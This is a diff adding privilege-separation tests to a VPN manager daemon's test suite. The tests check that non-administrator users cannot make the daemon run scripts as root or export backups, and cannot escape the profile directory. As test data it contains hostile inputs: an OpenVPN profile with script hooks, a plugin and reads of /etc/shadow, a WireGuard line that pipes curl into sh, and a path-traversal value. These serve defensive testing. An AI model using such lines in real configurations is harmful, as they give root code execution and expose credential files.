@@ -3199,6 +3199,81 @@ class HotspotTests(unittest.TestCase):
         self.assertEqual(m.status()["hotspots"], [])
 
 
+class PrivilegeTests(unittest.TestCase):
+    """A user who may use the daemon but is not an administrator (the logged-in desktop user, a vpnman group member)
+    must not be able to make it run programs of their choosing as root."""
+
+    def setUp(self):
+        from vpnman import access
+        self.access = access
+        self.m = Manager(settings=settings.Settings(TMP + "/priv-%d.json" % id(self)))
+
+    def tearDown(self):
+        self.access._caller.__dict__.clear()
+
+    def as_user(self):
+        self.access._caller.admin, self.access._caller.uid = False, 1000
+
+    def test_root_running_settings_are_for_administrators(self):
+        from vpnman.profiles import ProfileError
+        self.as_user()
+        for key, value in (("events.connected", "/tmp/x"), ("connection.openvpn_args", "--script-security,2"),
+                           ("access.mode", "session"), ("events", "{}")):
+            with self.assertRaises(ProfileError, msg=key):
+                daemon.METHODS["settings.set"](self.m, key, value)
+        with self.assertRaises(ProfileError):
+            daemon.METHODS["settings.update"](self.m, {"connection": {"openvpn_args": ["--up", "/x"]}})
+        daemon.METHODS["settings.update"](self.m, {"connection": {"timeout": 33}})          # the rest is allowed
+        self.assertEqual(self.m.settings.get("connection.timeout"), 33)
+        daemon.METHODS["settings.set"](self.m, "connection.retry_max", "4")
+        self.access._caller.admin = True
+        daemon.METHODS["settings.set"](self.m, "events.connected", "/usr/local/bin/hook")
+
+    def test_profiles_from_users_cannot_run_scripts(self):
+        ovpn = ("client\nremote 192.0.2.1 1194\nscript-security 2\nup /tmp/evil.sh\nplugin /tmp/evil.so\n"
+                "auth-user-pass /etc/shadow\nlog /etc/passwd\nca ca.crt\n<ca>\nX\n</ca>\n")
+        self.as_user()
+        p = self.m.import_profile("user.ovpn", ovpn, protocol="openvpn")
+        stored = self.m.store.find(p["id"])
+        self.assertTrue(stored.get("untrusted"))
+        backend = backends.get("openvpn")
+        q = self.m._restricted(backend, dict(stored, options={"extra_args": ["--up", "/x"]}))
+        with open(os.path.join(self.m.store.dir_of(stored), q["config"])) as fh:
+            text = fh.read()
+        for bad in ("script-security", "up /tmp", "plugin", "/etc/shadow", "/etc/passwd"):
+            self.assertNotIn(bad, text)
+        for good in ("remote 192.0.2.1 1194", "ca ca.crt", "<ca>"):
+            self.assertIn(good, text)
+        self.assertNotIn("extra_args", q["options"])
+        ctx = backends.Context(q, self.m.store.dir_of(stored), TMP, None, self.m.settings)
+        ctx.state.update(path="/x", text="client\n")
+        self.assertEqual(backend.connect_cmd(ctx)[-2:], ["--script-security", "1"])    # the last word, over the config
+        wg = backends.get("wireguard")
+        self.assertTrue(wg.restricted_line("PostUp = iptables -A x; curl evil | sh"))
+        self.assertFalse(wg.restricted_line("Endpoint = 192.0.2.1:51820"))
+        # an administrator's profile keeps what it has
+        self.access._caller.admin = True
+        p2 = self.m.import_profile("admin.ovpn", ovpn, protocol="openvpn")
+        self.assertFalse(self.m.store.find(p2["id"]).get("untrusted"))
+
+    def test_backups_hold_every_secret_so_only_administrators_export(self):
+        from vpnman.profiles import ProfileError
+        self.as_user()
+        with self.assertRaises(ProfileError):
+            daemon.METHODS["backup.export"](self.m)
+
+    def test_a_user_edit_marks_the_profile_and_config_stays_inside(self):
+        from vpnman.profiles import ProfileError
+        p = self.m.import_profile("a.ovpn", "client\nremote 192.0.2.1\n", protocol="openvpn")
+        self.as_user()
+        self.m.update_profile(p["id"], {"notes": "x"})
+        self.assertTrue(self.m.store.find(p["id"]).get("untrusted"))
+        self.m.update_profile(p["id"], {"config": "../../../../etc/shadow"})
+        self.assertEqual(self.m.store.find(p["id"])["config"], "shadow", "a file of the profile, never a path elsewhere")
+        with self.assertRaises(ProfileError):
+            self.m.update_profile(p["id"], {"config": "a/../.."})
+
+
 class ScheduleTests(unittest.TestCase):
     @staticmethod
     def at(wday, h, m):
